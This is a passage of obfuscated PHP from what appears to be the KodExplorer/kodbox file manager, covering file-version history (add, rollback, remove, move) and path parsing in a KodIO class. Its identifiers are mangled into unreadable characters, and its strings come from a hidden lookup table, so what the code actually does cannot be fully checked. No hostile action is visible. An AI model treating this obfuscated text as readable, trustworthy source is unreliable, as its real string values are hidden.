self::clearEmptyFolder(IO::pathFather($ı´·¯É[$íàœ·«…[97]])); } } private static function checkInHistory($¨›ÌÉ‚Ä) { $®¯íÚ™ = self::pathHistory($¨›ÌÉ‚Ä); if (!IO::exist($®¯íÚ™)) { $®¯íÚ™ .= $_SERVER[¼èá¯æÙ][1321]; } return IO::exist($®¯íÚ™) ? IO::info($®¯íÚ™) : !1; } private static function parsePath($ş‰æ«Í) { $ÁÁ·…ş =& $_SERVER[¼èá¯æÙ]; if (!$ş‰æ«Í) { return !1; } if (isset($GLOBALS[$ÁÁ·…ş[1322]]) && $GLOBALS[$ÁÁ·…ş[1322]]) { return; } $ú°ß€Äœ = KodIO::parse($ş‰æ«Í); $áÉ¦é€ = $ú°ß€Äœ[$ÁÁ·…ş[33]]; $‰—‹éŸá = !$áÉ¦é€ || $áÉ¦é€ == KodIO::KOD_IO || $áÉ¦é€ == KodIO::KOD_SHARE_ITEM; if (!$‰—‹éŸá || !$ú°ß€Äœ[$ÁÁ·…ş[1323]]) { return !1; } if (substr($ş‰æ«Í, 0, strlen(DATA_PATH . $ÁÁ·…ş[1324])) == DATA_PATH . $ÁÁ·…ş[1324]) { return !1; } if ($áÉ¦é€ == KodIO::KOD_SHARE_ITEM) { $™ ¸ı˜µ = IO::init($ş‰æ«Í); if ($™ ¸ı˜µ->pathParse[$ÁÁ·…ş[1237]]) { return self::parsePath($™ ¸ı˜µ->pathParse[$ÁÁ·…ş[1237]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $‰À£ˆ‡§ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ÁÁ·…ş[1325]); foreach ($‰À£ˆ‡§ as $‚¥åÇ”—) { if (!$áÉ¦é€ && substr($ş‰æ«Í, 0, strlen($‚¥åÇ”—)) == $‚¥åÇ”—) { return !1; } } self::log($GLOBALS[$ÁÁ·…ş[1232]] . $ÁÁ·…ş[1326] . $ş‰æ«Í); return $ş‰æ«Í; } private static function pathHistory($ìØùà ©) { $¢ßŒÎƒ‘ =& $_SERVER[¼èá¯æÙ]; $ñÅ¶Ê… = self::$_historyBase . ltrim(KodIO::clear($ìØùà ©), $¢ßŒÎƒ‘[8]); $ñÅ¶Ê… = str_replace(array($¢ßŒÎƒ‘[1327]), array($¢ßŒÎƒ‘[1328]), $ñÅ¶Ê…); return $ñÅ¶Ê…; } public static function log($Ö×µ“Ó×) { } public static function historyCount($¹ï‹À½ª) { $Ã„´Òü„ =& $_SERVER[¼èá¯æÙ]; $Õ¢ºü¡ = array(); $˜à¿¸½µ = array(); foreach ($¹ï‹À½ª as $Ñ¹¼€–š) { $³¡ÇÓ÷Í = get_path_father($Ñ¹¼€–š); if (!$˜à¿¸½µ[$³¡ÇÓ÷Í]) { $˜à¿¸½µ[$³¡ÇÓ÷Í] = array(); } $˜à¿¸½µ[$³¡ÇÓ÷Í][] = get_path_this($Ñ¹¼€–š); } foreach ($˜à¿¸½µ as $³¡ÇÓ÷Í => $úİ‹éê¨) { $€ÎÌ¿³¶ = self::parsePath($³¡ÇÓ÷Í); if (!$€ÎÌ¿³¶) { continue; } foreach ($úİ‹éê¨ as $íçœÉûÖ) { $¼ª¤ºÅ = self::listData(rtrim($€ÎÌ¿³¶, $Ã„´Òü„[8]) . $Ã„´Òü„[8] . $íçœÉûÖ, !1); if ($¼ª¤ºÅ && $¼ª¤ºÅ[$Ã„´Òü„[457]]) { $Õ¢ºü¡[rtrim($³¡ÇÓ÷Í, $Ã„´Òü„[8]) . $Ã„´Òü„[8] . $íçœÉûÖ] = count($¼ª¤ºÅ[$Ã„´Òü„[457]]); } } } return $Õ¢ºü¡; } public static function add($ú©µ’·) { $µàä’×€ =& $_SERVER[¼èá¯æÙ]; $Õ•¿“å‹ = self::listData($ú©µ’·); if (!$Õ•¿“å‹) { return; } $–¬ËÚÕ = Model($µàä’×€[852])->get($µàä’×€[1329]); $ÃÇ›»¥ = intval($GLOBALS[$µàä’×€[6]][$µàä’×€[102]][$µàä’×€[1307]]); $Ì¨¦ØÔ˜ = $–¬ËÚÕ == $µàä’×€[1330] ? min(5, $ÃÇ›»¥) : $ÃÇ›»¥; if ($ÃÇ›»¥ <= 0) { return; } $ŒßçùÜù = IO::info($ú©µ’·); $Æßœ´ôÃ = $Õ•¿“å‹[$µàä’×€[457]]; if ($ŒßçùÜù[$µàä’×€[89]] == 0) { return; } if ($ŒßçùÜù[$µàä’×€[89]] >= 1024 * 1024 * 500) { return !1; } $¯«š€¸Ú = IO::hashSimple($ú©µ’·); if ($Æßœ´ôÃ && $Æßœ´ôÃ[0][$µàä’×€[686]] == $¯«š€¸Ú) { return !0; } if (array_key_exists($µàä’×€[245], $ŒßçùÜù) && !$ŒßçùÜù[$µàä’×€[245]]) { return !1; } $ÈõÊ¢× = short_id(time()); $äô”ÕÂå = array($µàä’×€[486] => $ÈõÊ¢×, $µàä’×€[686] => $¯«š€¸Ú, $µàä’×€[32] => $ŒßçùÜù[$µàä’×€[32]] . $µàä’×€[10] . date($µàä’×€[1331]) . rand_string(1), $µàä’×€[89] => $ŒßçùÜù[$µàä’×€[89]], $µàä’×€[538] => USER_ID, $µàä’×€[243] => time(), $µàä’×€[1332] => $µàä’×€[12]); IO::mkdir($Õ•¿“å‹[$µàä’×€[1333]]); $£¦¡è…Æ = IO::copy($ú©µ’·, $Õ•¿“å‹[$µàä’×€[1333]], !1, $äô”ÕÂå[$µàä’×€[32]]); if (!$£¦¡è…Æ) { self::clearEmptyFolder($Õ•¿“å‹[$µàä’×€[1333]]); return !1; } array_unshift($Æßœ´ôÃ, $äô”ÕÂå); if (count($Æßœ´ôÃ) > $Ì¨¦ØÔ˜) { $ƒÈ«àè = array_slice($Æßœ´ôÃ, $Ì¨¦ØÔ˜); foreach ($ƒÈ«àè as $ĞÎ‚¶õı) { IO::remove($Õ•¿“å‹[$µàä’×€[1333]] . $ĞÎ‚¶õı[$µàä’×€[32]]); } $Æßœ´ôÃ = array_slice($Æßœ´ôÃ, 0, $Ì¨¦ØÔ˜); } return self::saveData($Õ•¿“å‹[$µàä’×€[1334]], $Æßœ´ôÃ); } public static function remove($öƒæ¦Š¶, $¶Ë®ò«–) { $¸Ÿ§ÎÀÁ =& $_SERVER[¼èá¯æÙ]; $—ë‹§ş§ = self::listData($öƒæ¦Š¶); $¾î§†­á = array(); if (!$—ë‹§ş§) { return !1; } foreach ($—ë‹§ş§[$¸Ÿ§ÎÀÁ[457]] as $éØË¶­Ò) { if ($éØË¶­Ò[$¸Ÿ§ÎÀÁ[486]] == $¶Ë®ò«–) { IO::remove($—ë‹§ş§[$¸Ÿ§ÎÀÁ[1333]] . $éØË¶­Ò[$¸Ÿ§ÎÀÁ[32]]); continue; } $¾î§†­á[] = $éØË¶­Ò; } return self::saveData($—ë‹§ş§[$¸Ÿ§ÎÀÁ[1334]], $¾î§†­á); } public static function clear($³‡êÍñË, $à¹üÛ›É = true) { $È±ßô¼À =& $_SERVER[¼èá¯æÙ]; $ùÛÚ¼Ûô = self::listData($³‡êÍñË, $à¹üÛ›É); if (!$ùÛÚ¼Ûô) { return !1; } foreach ($ùÛÚ¼Ûô[$È±ßô¼À[457]] as $ëú×–ğ) { IO::remove($ùÛÚ¼Ûô[$È±ßô¼À[1333]] . $ëú×–ğ[$È±ßô¼À[32]]); } return self::saveData($ùÛÚ¼Ûô[$È±ßô¼À[1334]], array()); } public static function moveHistory($†»øÔÑ—, $ïäØ½ì  = '', $Ä½÷Òß’ = '') { $Èß™ã×´ =& $_SERVER[¼èá¯æÙ]; $¬¨„Œâ = self::listData($†»øÔÑ—, !1); if (!$¬¨„Œâ || !$¬¨„Œâ[$Èß™ã×´[457]]) { return !1; } $ÌÍªá…Ì = $Èß™ã×´[1321]; $ïäØ½ì  = $ïäØ½ì  ? $ïäØ½ì  : get_path_this($†»øÔÑ—); $Ä½÷Òß’ = $Ä½÷Òß’ ? $Ä½÷Òß’ : $¬¨„Œâ[$Èß™ã×´[1333]]; $•ÑöùĞÉ = substr(get_path_this($¬¨„Œâ[$Èß™ã×´[1334]]), 0, -strlen($ÌÍªá…Ì)); foreach ($¬¨„Œâ[$Èß™ã×´[457]] as $¦À‘âÊ§ => $şÑÀíÄ¹) { $£Ù£íµÃ = $ïäØ½ì  . substr($şÑÀíÄ¹[$Èß™ã×´[32]], strlen($•ÑöùĞÉ)); $ãÉû‘Ç = IO::move($¬¨„Œâ[$Èß™ã×´[1333]] . $şÑÀíÄ¹[$Èß™ã×´[32]], $Ä½÷Òß’, !1, $£Ù£íµÃ); if ($ãÉû‘Ç) { $¬¨„Œâ[$Èß™ã×´[457]][$¦À‘âÊ§][$Èß™ã×´[32]] = $£Ù£íµÃ; } } $¬¨„Œâ[$Èß™ã×´[1334]] = IO::move($¬¨„Œâ[$Èß™ã×´[1334]], $Ä½÷Òß’, !1, $ïäØ½ì  . $ÌÍªá…Ì); self::saveData($¬¨„Œâ[$Èß™ã×´[1334]], $¬¨„Œâ[$Èß™ã×´[457]]); self::clearEmptyFolder($¬¨„Œâ[$Èß™ã×´[1333]]); } public static function rollback($¹ÍÌÒ, $ù£Ò¢°·) { $ôÌÀ§çº =& $_SERVER[¼èá¯æÙ]; $²ÊâÉ³ = self::listData($¹ÍÌÒ); if (!$²ÊâÉ³) { return; } $ï„˜ö©£ = IO::info($¹ÍÌÒ); foreach ($²ÊâÉ³[$ôÌÀ§çº[457]] as $¾á›šÈÔ => $°—¶íû¾) { if ($°—¶íû¾[$ôÌÀ§çº[486]] == $ù£Ò¢°·) { self::add($¹ÍÌÒ); $Ÿ»ª“šÀ = $²ÊâÉ³[$ôÌÀ§çº[1333]] . $°—¶íû¾[$ôÌÀ§çº[32]]; $öº¦¡â¿ = IO::copy($Ÿ»ª“šÀ, IO::pathFather($¹ÍÌÒ), REPEAT_REPLACE, $ï„˜ö©£[$ôÌÀ§çº[32]]); if ($öº¦¡â¿) { self::remove($¹ÍÌÒ, $ù£Ò¢°·); } return $öº¦¡â¿; } } return !1; } public static function setDetail($³¢…‰äº, $÷³£İ´Ñ, $…äšàÍ×) { $ëÕàÇ¨è =& $_SERVER[¼èá¯æÙ]; $ÅÁº‹Òı = self::listData($³¢…‰äº); if (!$ÅÁº‹Òı) { return; } foreach ($ÅÁº‹Òı[$ëÕàÇ¨è[457]] as $µòìŠ‡Ù => $ÕŒ“•÷—) { if ($ÕŒ“•÷—[$ëÕàÇ¨è[486]] == $÷³£İ´Ñ) { $ÅÁº‹Òı[$ëÕàÇ¨è[457]][$µòìŠ‡Ù][$ëÕàÇ¨è[1332]] = $…äšàÍ×; self::saveData($ÅÁº‹Òı[$ëÕàÇ¨è[1334]], $ÅÁº‹Òı[$ëÕàÇ¨è[457]]); return !0; } } return !1; } public static function fileInfo($€¶­ÈÔÓ, $ãÅÜ­ûú) { $ï¶à®«ê =& $_SERVER[¼èá¯æÙ]; $¶éŸ¨ÅË = self::listData($€¶­ÈÔÓ); if (!$¶éŸ¨ÅË) { show_json(LNG($ï¶à®«ê[118]), !1); } $Ôã±Ì£² = $ï¶à®«ê[12]; foreach ($¶éŸ¨ÅË[$ï¶à®«ê[457]] as $şÅ‰ÛµÓ => $·«´ÅÏ) { if ($·«´ÅÏ[$ï¶à®«ê[486]] != $ãÅÜ­ûú) { continue; } $Ôã±Ì£² = $¶éŸ¨ÅË[$ï¶à®«ê[1333]] . $·«´ÅÏ[$ï¶à®«ê[32]]; break; } if (!$Ôã±Ì£²) { show_json(LNG($ï¶à®«ê[118]), !1); } return IO::info($Ôã±Ì£²); } public static function fileOut($©ª¥¹âİ, $´ğö©é‡, $ÚŞäß¿Ù = false) { $ı·ºŞÙ± =& $_SERVER[¼èá¯æÙ]; $÷”‘«İ¢ = self::fileInfo($©ª¥¹âİ, $´ğö©é‡); $ôÀ‘Ë¾ =& $GLOBALS[$ı·ºŞÙ±[7]]; $ÚŞäß¿Ù = isset($ôÀ‘Ë¾[$ı·ºŞÙ±[1284]]) && $ôÀ‘Ë¾[$ı·ºŞÙ±[1284]] == 1; if (isset($ôÀ‘Ë¾[$ı·ºŞÙ±[33]]) && $ôÀ‘Ë¾[$ı·ºŞÙ±[33]] == $ı·ºŞÙ±[1335]) { return IO::fileOutImage($÷”‘«İ¢[$ı·ºŞÙ±[97]], $ôÀ‘Ë¾[$ı·ºŞÙ±[1336]]); } IO::fileOut($÷”‘«İ¢[$ı·ºŞÙ±[97]], $ÚŞäß¿Ù, get_path_this($©ª¥¹âİ)); } public static function listData($ï¶üÃÊ, $ªïßèæ½ = true) { $‰Ú›ÁÊ =& $_SERVER[¼èá¯æÙ]; if ($ªïßèæ½ && !IO::exist($ï¶üÃÊ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ï¶üÃÊ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $€›ÜÃ… = self::pathHistory($ï¶üÃÊ); $¢ïêûñ£ = array($‰Ú›ÁÊ[1334] => $€›ÜÃ… . $‰Ú›ÁÊ[1321], $‰Ú›ÁÊ[1333] => rtrim(get_path_father($€›ÜÃ…), $‰Ú›ÁÊ[8]) . $‰Ú›ÁÊ[8], $‰Ú›ÁÊ[457] => array()); $ò€øº§½ = IO::getContent($¢ïêûñ£[$‰Ú›ÁÊ[1334]]); if ($ò€øº§½) { $ÉÈä º… = json_decode($ò€øº§½, !0); if (is_array($ÉÈä º…)) { $¢ïêûñ£[$‰Ú›ÁÊ[457]] = $ÉÈä º…; } } return $¢ïêûñ£; } private static function saveData($Ì”…·ëŸ, $×ä¨Ü¢¡) { $úÉ½ÑÙî =& $_SERVER[¼èá¯æÙ]; self::log($úÉ½ÑÙî[1337] . $Ì”…·ëŸ . $úÉ½ÑÙî[84] . count($×ä¨Ü¢¡), $úÉ½ÑÙî[834]); if ($×ä¨Ü¢¡) { return IO::setContent($Ì”…·ëŸ, json_encode($×ä¨Ü¢¡)); } $ğÄÂª© = IO::pathFather($Ì”…·ëŸ); IO::remove($Ì”…·ëŸ); self::clearEmptyFolder($ğÄÂª©); return !0; } public static function clearEmptyFolder($È°Èí²) { $çúÑ«äÜ =& $_SERVER[¼èá¯æÙ]; if (trim($È°Èí², $çúÑ«äÜ[8]) == trim(self::$_historyBase, $çúÑ«äÜ[8])) { return; } $ˆ‹Ô¸Š× = IO::pathFather($È°Èí²); $Éƒ·¤ÏÛ = IO::has($È°Èí², !0); if ($Éƒ·¤ÏÛ[$çúÑ«äÜ[251]] > 0 || $Éƒ·¤ÏÛ[$çúÑ«äÜ[252]] > 0) { return; } IO::remove($È°Èí²); self::clearEmptyFolder($ˆ‹Ô¸Š×); } private static function getBasePath() { $½ÃÒÊ® =& $_SERVER[¼èá¯æÙ]; $Ñ²ß¨“ı = Model($½ÃÒÊ®[1338])->get($½ÃÒÊ®[1339]); if ($Ñ²ß¨“ı) { if (!IO::exist($Ñ²ß¨“ı)) { IO::mkdir($Ñ²ß¨“ı); } if (get_path_this($Ñ²ß¨“ı) == $½ÃÒÊ®[1324]) { $½•—éç• = $½ÃÒÊ®[1340] . rand_string(8); @rename($Ñ²ß¨“ı, get_path_father($Ñ²ß¨“ı) . $½ÃÒÊ®[8] . $½•—éç•); $Ñ²ß¨“ı = DATA_PATH . $½•—éç• . $½ÃÒÊ®[8]; file_put_contents(DATA_PATH . $½ÃÒÊ®[1271], $½ÃÒÊ®[12]); Model($½ÃÒÊ®[1338])->set($½ÃÒÊ®[1339], $Ñ²ß¨“ı); } return $Ñ²ß¨“ı; } $Ñ²ß¨“ı = DATA_PATH . $½ÃÒÊ®[1340] . rand_string(8) . $½ÃÒÊ®[8]; $Ñ²ß¨“ı = IO::mkdir($Ñ²ß¨“ı); $Ñ²ß¨“ı = rtrim($Ñ²ß¨“ı, $½ÃÒÊ®[8]) . $½ÃÒÊ®[8]; file_put_contents($Ñ²ß¨“ı . $½ÃÒÊ®[1271], $½ÃÒÊ®[12]); file_put_contents(DATA_PATH . $½ÃÒÊ®[1271], $½ÃÒÊ®[12]); Model($½ÃÒÊ®[1338])->set($½ÃÒÊ®[1339], $Ñ²ß¨“ı); return $Ñ²ß¨“ı; } } class KodIO { const KOD_SOURCE = "\173\x73\x6f\x75\162\143\145\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\163\145\162\x52\145\143\171\x63\x6c\145\175"; const KOD_USER_FAV = "\173\165\163\x65\x72\x46\141\166\175"; const KOD_USER_FILE_TAG = "\x7b\165\x73\x65\162\x46\151\x6c\x65\124\141\147\175"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\145\x72\106\x69\154\x65\x54\x79\160\145\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\157\165\160\x52\157\x6f\x74\x53\145\154\x66\x7d"; const KOD_USER_SHARE = "\x7b\165\x73\x65\162\x53\x68\141\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\165\163\145\x72\123\x68\141\162\x65\x4c\x69\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\x61\x72\x65\x54\x6f\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\163\x68\141\x72\x65\x49\164\145\155\x7d"; const KOD_SHARE_LINK = "\x7b\x73\x68\x61\x72\x65\x49\x74\x65\x6d\114\151\x6e\153\175"; const KOD_SEARCH = "\173\x73\145\141\162\x63\x68\x7d"; const KOD_BLOCK = "\x7b\x62\x6c\157\x63\x6b\x7d"; const KOD_IO = "\173\151\x6f\x7d"; const KOD_USER_RECENT = "\x7b\165\x73\145\162\x52\x65\x6e\x63\145\156\164\x7d"; const KOD_USER_DRIVER = "\x7b\144\162\x69\166\x65\162\175"; public static function typeList() { $åËÄ´‰ë =& $_SERVER[¼èá¯æÙ]; return array($åËÄ´‰ë[1341] => self::KOD_SOURCE, $åËÄ´‰ë[1342] => self::KOD_USER_RECYCLE, $åËÄ´‰ë[1343] => self::KOD_USER_FAV, $åËÄ´‰ë[1344] => self::KOD_USER_FILE_TAG, $åËÄ´‰ë[1345] => self::KOD_USER_FILE_TYPE, $åËÄ´‰ë[1346] => self::KOD_GROUP_ROOT_SELF, $åËÄ´‰ë[1347] => self::KOD_USER_SHARE, $åËÄ´‰ë[1348] => self::KOD_USER_SHARE_LINK, $åËÄ´‰ë[1349] => self::KOD_USER_SHARE_TO_ME, $åËÄ´‰ë[1350] => self::KOD_SHARE_ITEM, $åËÄ´‰ë[1351] => self::KOD_SHARE_LINK, $åËÄ´‰ë[1352] => self::KOD_SEARCH, $åËÄ´‰ë[1353] => self::KOD_BLOCK, $åËÄ´‰ë[1354] => self::KOD_IO, $åËÄ´‰ë[1355] => self::KOD_USER_RECENT, $åËÄ´‰ë[1356] => self::KOD_USER_DRIVER); } public static function parse($˜Öµ­Ôß) { $¦‰Ò²‰ˆ =& $_SERVER[¼èá¯æÙ]; $˜Öµ­Ôß = self::clear($˜Öµ­Ôß); $…Ñ€”Ôæ = array_values(self::typeList()); preg_match($¦‰Ò²‰ˆ[1357], $˜Öµ­Ôß, $’ø³®€‚); $¨˜²ã‹É = array($¦‰Ò²‰ˆ[507] => !1, $¦‰Ò²‰ˆ[1358] => !1, $¦‰Ò²‰ˆ[504] => !1, $¦‰Ò²‰ˆ[97] => $˜Öµ­Ôß, $¦‰Ò²‰ˆ[1256] => !1, $¦‰Ò²‰ˆ[1255] => $¦‰Ò²‰ˆ[12]); if (is_array($’ø³®€‚) && count($’ø³®€‚) == 5) { $á¨ÉöØ· = $¦‰Ò²‰ˆ[1359] . $’ø³®€‚[2] . $¦‰Ò²‰ˆ[414]; if (in_array($á¨ÉöØ·, $…Ñ€”Ôæ)) { $¨˜²ã‹É[$¦‰Ò²‰ˆ[1256]] = $’ø³®€‚[1]; $¨˜²ã‹É[$¦‰Ò²‰ˆ[33]] = $á¨ÉöØ·; $¨˜²ã‹É[$¦‰Ò²‰ˆ[1360]] = substr($á¨ÉöØ·, 1, -1); $¨˜²ã‹É[$¦‰Ò²‰ˆ[486]] = $’ø³®€‚[3]; } $¨˜²ã‹É[$¦‰Ò²‰ˆ[1255]] = $’ø³®€‚[4]; } $ıî×´µ¦ = array($¦‰Ò²‰ˆ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $¨˜²ã‹É[$¦‰Ò²‰ˆ[1323]] = in_array($¨˜²ã‹É[$¦‰Ò²‰ˆ[33]], $ıî×´µ¦); return $¨˜²ã‹É; } public static function isTruePath($œ É•Êá) { $¯¦ˆ™œÙ =& $_SERVER[¼èá¯æÙ]; if (substr($œ É•Êá, 0, 1) != $¯¦ˆ™œÙ[1359]) { return !0; } if (strpos($œ É•Êá, $¯¦ˆ™œÙ[494]) === 0) { return !0; } if (strpos($œ É•Êá, $¯¦ˆ™œÙ[1327]) === 0) { return !0; } if (strpos($œ É•Êá, $¯¦ˆ™œÙ[1361]) === 0) { return !0; } if (strpos($œ É•Êá, $¯¦ˆ™œÙ[1362]) === 0) { return !0; } if (strpos($œ É•Êá, $¯¦ˆ™œÙ[1363]) === 0) { return !0; } return !1; } public static function clear($ û—È) { $åê™¼İ¢ =& $_SERVER[¼èá¯æÙ]; $ û—È = str_replace(array($åê™¼İ¢[1161], $åê™¼İ¢[59]), $åê™¼İ¢[53], $ û—È); $ û—È = str_replace($åê™¼İ¢[110], $åê™¼İ¢[8], $ û—È); $Ÿ¾ùâİ‹ = $åê™¼İ¢[1364]; if (substr($ û—È, 0, 3) == $åê™¼İ¢[1365]) { $ û—È = substr($ û—È, 3); } while (strstr($ û—È, $Ÿ¾ùâİ‹)) { $ û—È = str_replace($Ÿ¾ùâİ‹, $åê™¼İ¢[8], $ û—È); } $ û—È = preg_replace($åê™¼İ¢[1366], $åê™¼İ¢[8], $ û—È); if ($ û—È == $åê™¼İ¢[8]) { return $åê™¼İ¢[8]; } $ û—È = rtrim($ û—È, $åê™¼İ¢[8]); return $ û—È; } public static function pathTrue($ü´ŠÁÈŸ) { $”Ï€Â€ =& $_SERVER[¼èá¯æÙ]; if (!$ü´ŠÁÈŸ) { return $”Ï€Â€[12]; } $ü´ŠÁÈŸ = str_replace($”Ï€Â€[266], $”Ï€Â€[8], str_replace($”Ï€Â€[1367], $”Ï€Â€[8], $ü´ŠÁÈŸ)); $ü´ŠÁÈŸ = str_replace($”Ï€Â€[266], $”Ï€Â€[8], str_replace($”Ï€Â€[1367], $”Ï€Â€[8], $ü´ŠÁÈŸ)); if (!strstr($ü´ŠÁÈŸ, $”Ï€Â€[1365])) { return $ü´ŠÁÈŸ; } $¤ä¤æÚ­ = explode($”Ï€Â€[8], $ü´ŠÁÈŸ); foreach ($¤ä¤æÚ­ as $İÄ™Ù°” => $‰±‹¡§¸) { if ($‰±‹¡§¸ !== $”Ï€Â€[1368]) { continue; } for ($£ì‹ûÂ = $İÄ™Ù°”; $£ì‹ûÂ >= 0; $£ì‹ûÂ--) { if ($¤ä¤æÚ­[$£ì‹ûÂ] === $”Ï€Â€[10] || $¤ä¤æÚ­[$£ì‹ûÂ] === $”Ï€Â€[1368] || $¤ä¤æÚ­[$£ì‹ûÂ] === -1) { continue; } if ($¤ä¤æÚ­[$£ì‹ûÂ] === $”Ï€Â€[12]) { $¤ä¤æÚ­[$İÄ™Ù°”] = -1; break; } $¤ä¤æÚ­[$İÄ™Ù°”] = -1; $¤ä¤æÚ­[$£ì‹ûÂ] = -1; break; } } $ üÀŒƒœ = array(); foreach ($¤ä¤æÚ­ as $‰±‹¡§¸) { if ($‰±‹¡§¸ !== -1) { $ üÀŒƒœ[] = $‰±‹¡§¸; } } $ÈÙ²ã§Ó = implode($”Ï€Â€[8], $ üÀŒƒœ); if (strpos($ÈÙ²ã§Ó, $”Ï€Â€[1369]) === 0) { $ÈÙ²ã§Ó = $”Ï€Â€[1365] . substr($ÈÙ²ã§Ó, strlen($”Ï€Â€[1369])); } return $ÈÙ²ã§Ó; } public static function pathUrlClear($²ºúŒ²Ò) { $Ï†ƒİı» =& $_SERVER[¼èá¯æÙ]; if (!$²ºúŒ²Ò) { return $²ºúŒ²Ò; } $²ºúŒ²Ò = rawurldecode($²ºúŒ²Ò); $²ºúŒ²Ò = str_replace($Ï†ƒİı»[1367], $Ï†ƒİı»[8], $²ºúŒ²Ò); if (strpos($²ºúŒ²Ò, $Ï†ƒİı»[86]) > 0) { $²ºúŒ²Ò = substr($²ºúŒ²Ò, 0, strpos($²ºúŒ²Ò, $Ï†ƒİı»[86])); } if (strpos($²ºúŒ²Ò, $Ï†ƒİı»[1370]) > 0) { $²ºúŒ²Ò = substr($²ºúŒ²Ò, 0, strpos($²ºúŒ²Ò, $Ï†ƒİı»[1370])); } return $²ºúŒ²Ò; } public static function sourceID($Ğ›§òÉ¶) { $¤¦²Ëæä =& $_SERVER[¼èá¯æÙ]; $Åî…†ä» = self::parse($Ğ›§òÉ¶); if ($Åî…†ä»[$¤¦²Ëæä[33]] !== self::KOD_SOURCE) { show_json(LNG($¤¦²Ëæä[1371]), !1); } return $Åî…†ä»[$¤¦²Ëæä[486]]; } public static function make($ñÕ§çé) { if (!$ñÕ§çé) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ñÕ§çé)); } public static function makeShare($™â½„©ë, $„‡›ÁÅ¹) { return self::makePath(self::KOD_SHARE_ITEM, $™â½„©ë, $„‡›ÁÅ¹); } public static function makeFileTypePath($†•Ğ¨´) { return self::makePath(self::KOD_USER_FILE_TYPE, $†•Ğ¨´); } public static function makeFileTagPath($ÈåÇ˜È¨) { return self::makePath(self::KOD_USER_FILE_TAG, $ÈåÇ˜È¨); } public static function makePath($èÂ–èÀ¢, $ÏõĞü¯Æ = '', $ø½ôã“ = '') { $Ş­âæ½ö =& $_SERVER[¼èá¯æÙ]; $‚ì¢‰”‹ = substr($èÂ–èÀ¢, 1, -1); $›Å¢¾… = $Ş­âæ½ö[1372] . $‚ì¢‰”‹ . $Ş­âæ½ö[1373] . $ÏõĞü¯Æ . $Ş­âæ½ö[1374]; $›Å¢¾… = $ø½ôã“ ? $›Å¢¾… . $ø½ôã“ . $Ş­âæ½ö[8] : $›Å¢¾…; return $›Å¢¾…; } public static function hashPath($‡Äìå³º, $ôøşñ‹ = true) { $¡²±©œˆ =& $_SERVER[¼èá¯æÙ]; $Ç™ê–Ô€ = is_array($‡Äìå³º) ? $‡Äìå³º : IO::info($‡Äìå³º); $÷¥Œ†Ã¢ = _get($Ç™ê–Ô€, $¡²±©œˆ[1375], $¡²±©œˆ[12]); if (!$÷¥Œ†Ã¢ && isset($Ç™ê–Ô€[$¡²±©œˆ[247]])) { $÷¥Œ†Ã¢ = trim($Ç™ê–Ô€[$¡²±©œˆ[247]], $¡²±©œˆ[131]); } if (!$÷¥Œ†Ã¢ && isset($Ç™ê–Ô€[$¡²±©œˆ[203]]) && $Ç™ê–Ô€[$¡²±©œˆ[203]]) { $Ç™ê–Ô€ = IO::info(KodIO::make($Ç™ê–Ô€[$¡²±©œˆ[203]])); $÷¥Œ†Ã¢ = _get($Ç™ê–Ô€, $¡²±©œˆ[1375], $¡²±©œˆ[12]); } $¹âÀúåâ = md5($Ç™ê–Ô€[$¡²±©œˆ[97]] . $Ç™ê–Ô€[$¡²±©œˆ[89]] . $Ç™ê–Ô€[$¡²±©œˆ[98]]); if (!$÷¥Œ†Ã¢ && file_exists($Ç™ê–Ô€[$¡²±©œˆ[97]])) { $÷¥Œ†Ã¢ = Cache::get($¹âÀúåâ . $¡²±©œˆ[1376]); $÷¥Œ†Ã¢ = !1; if (!$÷¥Œ†Ã¢) { $÷¥Œ†Ã¢ = IO::hashSimple($Ç™ê–Ô€[$¡²±©œˆ[97]]); Cache::set($¹âÀúåâ . $¡²±©œˆ[1376], $÷¥Œ†Ã¢, 3600 * 24 * 30); } } if ($ôøşñ‹ && !$÷¥Œ†Ã¢) { } return $÷¥Œ†Ã¢ ? $÷¥Œ†Ã¢ : $¹âÀúåâ; } public static function hashPathSafe($©öö÷öŠ, $ßŸ‰Î£Ü = true) { $ÓßÎÕä =& $_SERVER[¼èá¯æÙ]; $ãïûí´ = self::hashPath($©öö÷öŠ, $ßŸ‰Î£Ü); return md5($ãïûí´ . $ÓßÎÕä[1377] . Model($ÓßÎÕä[852])->get($ÓßÎÕä[853])); } public static function initSystemPath() { $èƒÇëì =& $_SERVER[¼èá¯æÙ]; if (defined($èƒÇëì[1378])) { return; } define($èƒÇëì[1378], self::systemPath($èƒÇëì[201])); define($èƒÇëì[1379], self::systemPath($èƒÇëì[1380])); define($èƒÇëì[1381], self::systemPath($èƒÇëì[1382])); define($èƒÇëì[1383], self::systemPath($èƒÇëì[1384])); IOHistory::bindEvent(); } public static function systemPath($ºì±ãü„) { $¯®°Ì =& $_SERVER[¼èá¯æÙ]; $¶’ò¶¥ = $¯®°Ì[1385] . ucfirst($ºì±ãü„); $ïæ›ŞÄ… = Model($¯®°Ì[852])->get($¶’ò¶¥); if ($ïæ›ŞÄ…) { return $ïæ›ŞÄ…; } if ($ºì±ãü„ == $¯®°Ì[201]) { $ïæ›ŞÄ… = self::make(Model($¯®°Ì[907])->systemRootPathAdd($¯®°Ì[619])); } else { $ïæ›ŞÄ… = self::systemPath($¯®°Ì[201]); $ô¸åé  = self::sourceID($ïæ›ŞÄ…); $ïæ›ŞÄ… = self::make(Model($¯®°Ì[907])->mkdir($ô¸åé , $ºì±ãü„)); } Model($¯®°Ì[852])->set($¶’ò¶¥, $ïæ›ŞÄ…); return $ïæ›ŞÄ…; } public static function systemFolder($Â‰ñû’Ë) { $İ™ÛÛª‘ = IO_PATH_SYSTEM_SOURCE . $Â‰ñû’Ë; $¾­ûÄáÕ = Cache::get($İ™ÛÛª‘); if 